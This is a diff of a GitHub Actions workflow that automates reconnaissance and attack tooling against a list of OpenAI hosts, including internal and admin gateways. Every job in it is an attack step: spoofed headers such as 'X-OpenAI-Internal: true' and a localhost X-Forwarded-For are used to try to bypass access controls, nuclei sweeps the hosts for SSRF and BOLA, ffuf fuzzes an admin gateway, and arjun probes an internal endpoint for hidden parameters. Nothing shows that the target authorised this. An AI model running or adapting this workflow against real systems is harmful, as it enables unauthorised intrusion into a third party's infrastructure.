@@ -1,4 +1,4 @@
-name: OpenAI-Hyper-Scan-Detection
+name: OpenAI-poori-tayoli
 on:
   workflow_dispatch:
 
@@ -9,18 +9,20 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Install Speed Arsenal
+      - name: Install Advanced Arsenal
         run: |
-          # Installing Go-based tools for extreme speed
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
           go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           go install -v github.com/ffuf/ffuf/v2@latest
           pip install arjun
           sudo mv ~/go/bin/* /usr/local/bin/
+          # Download professional bug bounty wordlists
+          mkdir -p wordlists
+          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o wordlists/common.txt
+          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints-res.txt -o wordlists/api.txt
 
-      - name: Phase 1:Rapid Scope Aggregation
+      - name: Phase 1:Rapid Bypass Testing
         run: |
-          # Automatically pulling all critical internal/unified shards from history
           cat <<EOF > master_targets.txt
           https://api.openai.com/v1/completionsinternal
           https://admin.unified-8.api.openai.com
@@ -35,41 +37,35 @@ jobs:
           https://academy.openai.com
           EOF
 
-      - name: Phase 2:Asynchronous Header Injection (Bypass Detection)
-        run: |
-          # Using httpx with custom headers to detect WAF bypasses in seconds.
-          # We look for status code changes or content-length anomalies.
           httpx -l master_targets.txt -threads 100 \
             -H "X-OpenAI-Internal: true" \
             -H "X-Forwarded-For: 127.0.0.1" \
-            -H "X-Real-IP: 10.0.0.1" \
-            -H "X-Original-URL: /admin" \
-            -sc -cl -title -o hyper_bypass_results.txt
+            -sc -cl -title -o bypass_results.txt
 
-      - name: Phase 3:High-Velocity Vulnerability Sweep
+      - name: Phase 2:Critical Vulnerability Sweep
         run: |
-          # Nuclei running 'critical' templates only for speed (SSRF, BOLA, IDOR).
-          nuclei -l master_targets.txt -severity critical,high -rl 50 -bs 25 -o nuclei_fast_results.txt
+          # Fast scan for SSRF and BOLA
+          nuclei -l master_targets.txt -severity critical,high -rl 50 -o nuclei_results.txt
 
-      - name: Phase 4:Hidden API Parameter Discovery
+      - name: Phase 3:Hidden API Route Fuzzing (FIXED)
         run: |
-          # Arjun finds hidden parameters (like 'debug=true' or 'admin=1')
-          # that often exist on internal unified gateways.
-          arjun -i master_targets.txt -m POST -t 10 -oJ arjun_params.json
+          # Fuzzing the internal admin gateways using professional wordlists
+          # We use -maxtime to ensure it doesn't hang but finds the core bugs
+          ffuf -w wordlists/common.txt -u "https://admin.unified-8.api.openai.com/FUZZ" \
+            -H "X-OpenAI-Internal: true" -mc 200,401,500 -maxtime 300 -o api_fuzz_results.json
 
-      - name: Phase 5:Fuzzing for Internal Endpoints
+      - name: Phase 4:Parameter Discovery
         run: |
-          # Fuzzing common internal paths on the 'unified' shards.
-          ffuf -w /usr/share/dict/words -u "https://admin.unified-8.api.openai.com/FUZZ" \
-            -mc 200,401,500 -t 50 -o api_fuzz_results.json
+          # Finding hidden parameters on the completionsinternal endpoint
+          arjun -u "https://api.openai.com/v1/completionsinternal" -m POST -t 20 -oJ arjun_params.json
 
-      - name: Consolidate Evidence
+      - name: Archive Results
         uses: actions/upload-artifact@v4
         with:
-          name: hyper-scan-evidence
+          name: final-bug-evidence
           path: |
-            hyper_bypass_results.txt
-            nuclei_fast_results.txt
-            arjun_params.json
+            bypass_results.txt
+            nuclei_results.txt
             api_fuzz_results.json
+            arjun_params.json
             
